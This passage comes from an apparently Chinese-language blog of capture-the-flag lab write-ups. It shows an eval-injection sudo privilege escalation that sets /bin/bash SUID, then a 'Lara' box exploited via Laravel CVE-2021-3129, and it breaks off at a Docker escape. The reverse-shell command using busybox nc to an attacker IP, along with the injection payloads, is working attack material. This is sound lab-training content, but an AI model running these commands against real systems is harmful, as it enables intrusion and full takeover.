xmgmxjs:<br>    Defaults!/usr/bin/sqlmap, !/usr/bin/sqlmap *--tamper* env_reset<br><br>User xmgmxjs may run the following commands on FCT:<br>    (root) NOPASSWD: /usr/bin/sqlmap, !/usr/bin/sqlmap *--tamper*<br>    (ALL) NOPASSWD: /opt/123.sh<br></code></pre></td></tr></table></figure><p>查看<code>/opt/123.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">xmgmxjs@FCT:~$ grep . /opt/123.sh <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;#1&#125;</span>&quot;</span> -eq 2 ]; <span class="hljs-keyword">then</span><br>          <span class="hljs-built_in">eval</span> <span class="hljs-built_in">cat</span> <span class="hljs-variable">$1</span>.hidden<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;#1&#125;</span>&quot;</span> -gt 2 ]; <span class="hljs-keyword">then</span><br>          <span class="hljs-built_in">eval</span> <span class="hljs-built_in">echo</span> \<span class="hljs-variable">$&#123;FTC_<span class="hljs-variable">$&#123;1&#125;</span>:-<span class="hljs-variable">$HOME</span>&#125;</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>脚本限制了第一个参数 <code>$1</code> 的长度必须等于 2<br>我们要利用 eval 的特性，传入一个长度为 2 的特殊变量，让它在 eval 执行时展开成我们在后续参数中隐藏的恶意命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">xmgmxjs@FCT:~$ <span class="hljs-built_in">sudo</span> /opt/123.sh <span class="hljs-string">&#x27;1&#125;;id;#&#x27;</span><br><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>获取root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">xmgmxjs@FCT:~$ <span class="hljs-built_in">sudo</span> /opt/123.sh <span class="hljs-string">&#x27;1&#125;;chmod +s /bin/bash;#&#x27;</span><br><br>xmgmxjs@FCT:~$ <span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash<br><br>xmgmxjs@FCT:~$ /bin/bash -p<br>bash-5.0# <span class="hljs-built_in">id</span><br>uid=1000(xmgmxjs) gid=1000(xmgmxjs) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(xmgmxjs)<br></code></pre></td></tr></table></figure><h1 id="五、查看FLAG"><a href="#五、查看FLAG" class="headerlink" title="五、查看FLAG"></a>五、查看FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0# <span class="hljs-built_in">tac</span> /root/root.txt /home/xmgmxjs/user.txt <br>flag&#123;root-jyt/DLUwE8JEy2v5EuykzPeL&#125;<br>flag&#123;user-JLUSoJGCnTndpKfYIcPT0AZa&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php命令执行</tag>
      
      <tag>unicode零宽字符隐写</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lara</title>
    <link href="/Maze-sec/Lara/"/>
    <url>/Maze-sec/Lara/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 14:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00068s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00032s latency).<br>MAC Address: 08:00:27:AE:80:30 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.32<br>Host is up (0.00062s latency).<br>MAC Address: 08:00:27:26:B6:62 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.16 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.32</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.32                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 14:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.32<br>Host is up (0.0012s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>8000/tcp open  http-alt<br>MAC Address: 08:00:27:26:B6:62 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 33.57 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、8000</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,8000 192.168.2.32<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 14:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.32<br>Host is up (0.0011s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)<br>80/tcp   open  http    nginx<br>|_http-title: Ping Utility<br>8000/tcp open  http    (PHP 7.3.31)<br>| fingerprint-strings: <br>|   FourOhFourRequest: <br>|     HTTP/1.0 404 Not Found<br>|     Date: Mon, 05 Jan 2026 06:53:59 GMT<br>|     Connection: close<br>|     X-Powered-By: PHP/7.3.31<br>|     Cache-Control: no-cache, private<br>|     <span class="hljs-built_in">date</span>: Mon, 05 Jan 2026 06:53:59 GMT<br>|     Content-<span class="hljs-built_in">type</span>: text/html; charset=UTF-8<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>|     &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;<br>|     &lt;title&gt;Not Found&lt;/title&gt;<br>|     &lt;!-- Fonts --&gt;<br>|     &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;preconnect&quot;</span> href=<span class="hljs-string">&quot;https://fonts.gstatic.com&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css2?family=Nunito&amp;display=swap&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>|     &lt;style&gt;<br>|     normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html&#123;line-height:1.15;-webkit-text-size-adjust:100%&#125;body&#123;margin:0&#125;a&#123;background-color:transparent&#125;code&#123;font-family:monospace,monospace;font-size:1em&#125;[hidden]&#123;display:none&#125;html&#123;font-family:system-ui,-app<br>|   GetRequest: <br>|     HTTP/1.0 200 OK<br>|     Date: Mon, 05 Jan 2026 06:53:59 GMT<br>|     Connection: close<br>|     X-Powered-By: PHP/7.3.31<br>|     Content-Type: text/html; charset=UTF-8<br>|     Cache-Control: private, must-revalidate<br>|     Date: Mon, 05 Jan 2026 06:53:59 GMT<br>|     pragma: no-cache<br>|     expires: -1<br>|     Set-Cookie: XSRF-TOKEN=eyJpdiI6IlhCV29pREd4YUsyQ2R3TG4wQUVzK2c9PSIsInZhbHVlIjoiWFdBeEJIYTl5VWpSRktLSjlwL0RMeHBVdmVXYjc2MHp0MWhaeDFncU45UTQ4Z0t5TWZtRDJEM25DU0ZnTUxLUWFZb3l5cjJrVGJMeHV5ZGhHY0p1Mm95aGhpSTdGQWdVNnhjQlQ1L0creTRZY1cyamdsQ3dpUkdZVVM1NnB5dnkiLCJtYWMiOiJlOWYzZTE3OWQzYjUzZWFiY2Q4NDVkYTFhNjQzZDZmZDU1OGZjMzMyM2RjMzgwYzQ3NzY4ZmQyNjM5YzIwODRiIiwidGFnIjoiIn0%3D; expires=Mon, 05-Jan-2026 08:53:59 GMT; Max-Age=7200; path=/; samesite=lax<br>|_    Set-Cookie: laravel_session=eyJpdiI6ImRkS1FjcUFNQm9rTk5hc2Fab3B4UkE9PSIsInZhbHVlIjoiSXk3ekJqbkFOTTZFVGdCL2hCQm9ZdDBYZ3BFN2g2L2tzSkJ4bElOOHhybWplb3V0ODFJK1hPUFA5bTFEVjErTzl2RFFwdFFGYjJ1MFR0V1VWckRnTmhpQnNqcitxSU<br>|_http-title: Laravel<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port8000-TCP:V=7.94SVN%I=7%D=1/5%Time=695B6009%P=x86_64-pc-linux-gnu%r(<br>SF:GetRequest,48C0,<span class="hljs-string">&quot;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2005\x20Jan\x</span><br><span class="hljs-string">SF:202026\x2006:53:59\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20P</span><br><span class="hljs-string">SF:HP/7\.3\.31\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nCache-Co</span><br><span class="hljs-string">SF:ntrol:\x20private,\x20must-revalidate\r\nDate:\x20Mon,\x2005\x20Jan\x20</span><br><span class="hljs-string">SF:2026\x2006:53:59\x20GMT\r\npragma:\x20no-cache\r\nexpires:\x20-1\r\nSet</span><br><span class="hljs-string">SF:-Cookie:\x20XSRF-TOKEN=eyJpdiI6IlhCV29pREd4YUsyQ2R3TG4wQUVzK2c9PSIsInZh</span><br><span class="hljs-string">SF:bHVlIjoiWFdBeEJIYTl5VWpSRktLSjlwL0RMeHBVdmVXYjc2MHp0MWhaeDFncU45UTQ4Z0t</span><br><span class="hljs-string">SF:5TWZtRDJEM25DU0ZnTUxLUWFZb3l5cjJrVGJMeHV5ZGhHY0p1Mm95aGhpSTdGQWdVNnhjQl</span><br><span class="hljs-string">SF:Q1L0creTRZY1cyamdsQ3dpUkdZVVM1NnB5dnkiLCJtYWMiOiJlOWYzZTE3OWQzYjUzZWFiY</span><br><span class="hljs-string">SF:2Q4NDVkYTFhNjQzZDZmZDU1OGZjMzMyM2RjMzgwYzQ3NzY4ZmQyNjM5YzIwODRiIiwidGFn</span><br><span class="hljs-string">SF:IjoiIn0%3D;\x20expires=Mon,\x2005-Jan-2026\x2008:53:59\x20GMT;\x20Max-A</span><br><span class="hljs-string">SF:ge=7200;\x20path=/;\x20samesite=lax\r\nSet-Cookie:\x20laravel_session=e</span><br><span class="hljs-string">SF:yJpdiI6ImRkS1FjcUFNQm9rTk5hc2Fab3B4UkE9PSIsInZhbHVlIjoiSXk3ekJqbkFOTTZF</span><br><span class="hljs-string">SF:VGdCL2hCQm9ZdDBYZ3BFN2g2L2tzSkJ4bElOOHhybWplb3V0ODFJK1hPUFA5bTFEVjErTzl</span><br><span class="hljs-string">SF:2RFFwdFFGYjJ1MFR0V1VWckRnTmhpQnNqcitxSU&quot;</span>)%r(FourOhFourRequest,1AAC,<span class="hljs-string">&quot;HTT</span><br><span class="hljs-string">SF:P/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Mon,\x2005\x20Jan\x202026\x20</span><br><span class="hljs-string">SF:06:53:59\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.3\.3</span><br><span class="hljs-string">SF:1\r\nCache-Control:\x20no-cache,\x20private\r\ndate:\x20Mon,\x2005\x20J</span><br><span class="hljs-string">SF:an\x202026\x2006:53:59\x20GMT\r\nContent-type:\x20text/html;\x20charset</span><br><span class="hljs-string">SF:=UTF-8\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n\x20\x20\x20\x</span><br><span class="hljs-string">SF:20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n</span><br><span class="hljs-string">SF:\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\</span><br><span class="hljs-string">SF:&quot;</span>width=device-width,\x20initial-scale=1\&quot;&gt;\n\n\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20&lt;title&gt;Not\x20Found&lt;/title&gt;\n\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;<br>SF:!--\x20Fonts\x20--&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;<span class="hljs-built_in">link</span>\x20rel=\&quot;pre<br>SF:connect\&quot;\x20href=\&quot;https://fonts\.gstatic\.com\&quot;&gt;\n\x20\x20\x20\x20\x2<br>SF:0\x20\x20\x20&lt;<span class="hljs-built_in">link</span>\x20href=\&quot;https://fonts\.googleapis\.com/css2\?famil<br>SF:y=Nunito&amp;display=swap\&quot;\x20rel=\&quot;stylesheet\&quot;&gt;\n\n\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20/\*<br>SF:!\x20normalize\.css\x20v8\.0\.1\x20\|\x20MIT\x20License\x20\|\x20github<br>SF:\.com/necolas/normalize\.css\x20\*/html&#123;line-height:1\.15;-webkit-text-<br>SF:size-adjust:100%&#125;body&#123;margin:0&#125;a&#123;background-color:transparent&#125;code&#123;font<br>SF:-family:monospace,monospace;font-size:1em&#125;\[hidden\]&#123;display:none&#125;html&#123;<br>SF:font-family:system-ui,-app<span class="hljs-string">&quot;);</span><br><span class="hljs-string">MAC Address: 08:00:27:26:B6:62 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 23.71 seconds</span><br></code></pre></td></tr></table></figure><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.32                         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 14:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.32<br>Host is up (0.00095s latency).<br>All 100 scanned ports on 192.168.2.32 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 100 closed udp ports (port-unreach)<br>MAC Address: 08:00:27:26:B6:62 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 99.03 seconds<br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口，发现是一个PING测试工具<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601071540077.png"></p><p>目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.32&quot;</span>     <br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /miaosec/reports/http_192.168.2.32/_26-01-07_15-41-19.txt<br><br>Target: http://192.168.2.32/<br><br>[15:41:19] Starting: <br>[15:41:22] 403 -  548B  - /.ht_wsr.txt<br>[15:41:22] 403 -  548B  - /.htaccess.bak1<br>[15:41:22] 403 -  548B  - /.htaccess.orig<br>[15:41:22] 403 -  548B  - /.htaccess.sample<br>[15:41:22] 403 -  548B  - /.htaccess.save<br>[15:41:22] 403 -  548B  - /.htaccessBAK<br>[15:41:22] 403 -  548B  - /.htaccess_orig<br>[15:41:22] 403 -  548B  - /.htaccessOLD<br>[15:41:22] 403 -  548B  - /.htaccess_sc<br>[15:41:22] 403 -  548B  - /.htaccessOLD2<br>[15:41:22] 403 -  548B  - /.htaccess_extra<br>[15:41:22] 403 -  548B  - /.htm<br>[15:41:22] 403 -  548B  - /.html<br>[15:41:22] 403 -  548B  - /.htpasswd_test<br>[15:41:22] 403 -  548B  - /.httr-oauth<br>[15:41:22] 403 -  548B  - /.htpasswds<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>无任何东西</p><h2 id="2、8000-Laravel"><a href="#2、8000-Laravel" class="headerlink" title="2、8000-Laravel"></a>2、8000-Laravel</h2><p>访问8080端口，发现是一个<code>Laravel</code>cms，版本为<code>8.83.29</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601071542205.png"></p><p>直接使用<code>TScan</code>进行漏洞扫描<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601071545300.png"></p><p>开启了<code>Debug</code>模式，搜索发现一个RCE漏洞<code>CVE-2021-3129</code></p><p>使用的EXP：<a href="https://github.com/joshuavanderpoll/CVE-2021-3129">CVE-2021-3129</a></p><p>反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(.venv)─(root㉿kali)-[/tmp/CVE-2021-3129]<br>└─# python3 CVE-2021-3129.py --host http://192.168.2.32:8000 --force --<span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;busybox nc 192.168.2.4 4444 -e /bin/sh&#x27;</span> --chain Laravel/RCE12<br>  _____   _____   ___ __ ___ _    _____ ___ ___ <br> / __\ \ / / __|_|_  )  \_  ) |__|__ / |_  ) _ \<br>| (__ \ V /| _|___/ / () / /| |___|_ \ |/ /_,  /<br> \___| \_/ |___| /___\__/___|_|  |___/_/___|/_/ <br> https://github.com/joshuavanderpoll/CVE-2021-3129<br> Using PHPGGC: https://github.com/ambionics/phpggc<br><br>[@] Starting the exploit on <span class="hljs-string">&quot;http://192.168.2.32:8000/&quot;</span>...<br>[@] Testing vulnerable URL <span class="hljs-string">&quot;http://192.168.2.32:8000/_ignition/execute-solution&quot;</span>...<br>[@] Searching Laravel <span class="hljs-built_in">log</span> file path...<br>[•] Laravel seems to be running on a Linux based machine.<br>[√] Laravel <span class="hljs-built_in">log</span> path: <span class="hljs-string">&quot;/src/laravel/storage/logs/laravel.log&quot;</span>.<br>[•] Laravel version found: <span class="hljs-string">&quot;8.83.29&quot;</span>.<br>[@] Clearing Laravel logs...<br>[@] Executing <span class="hljs-built_in">command</span> <span class="hljs-string">&quot;busybox nc 192.168.2.4 4444 -e /bin/sh&quot;</span>...<br>[@] Generating payload...<br>[√] Generated 1 payloads.<br>[@] Trying chain Laravel/RCE12 [1/1]...<br>[@] Clearing logs...<br>[@] Causing error <span class="hljs-keyword">in</span> logs...<br>[√] Caused error <span class="hljs-keyword">in</span> logs.<br>[@] Sending payloads...<br>[√] Sent payload.<br>[@] Converting payload...<br>[√] Converted payload.<br></code></pre></td></tr></table></figure><p>获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.32] 45673<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)<br></code></pre></td></tr></table></figure><h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><p>查看发现，处于docker容器中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -la /<br>total 76<br>drwxr-xr-x    1 root     root          4096 Dec 27 14:52 .<br>drwxr-xr-x    1 root     root          4096 Dec 27 14:52 ..<br>-rwxr-xr-x    1 root     root             0 Dec 27 14:52 .dockerenv<br>drwxr-xr-x    1 root     root          4096 Oct 15  2021 bin<br>drwxr-xr-x    5 root     root           320 Jan  7 07:39 dev<br>.....<br></code></pre></td></tr></table></figure><h2 id="1、docker挂载逃逸"><a href="#1、docker挂载逃逸" class="headerlink" title="1、docker挂载逃逸"></a>1、docker挂载逃逸</h2><p>查看挂载点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/mounts<br>overlay / overlay 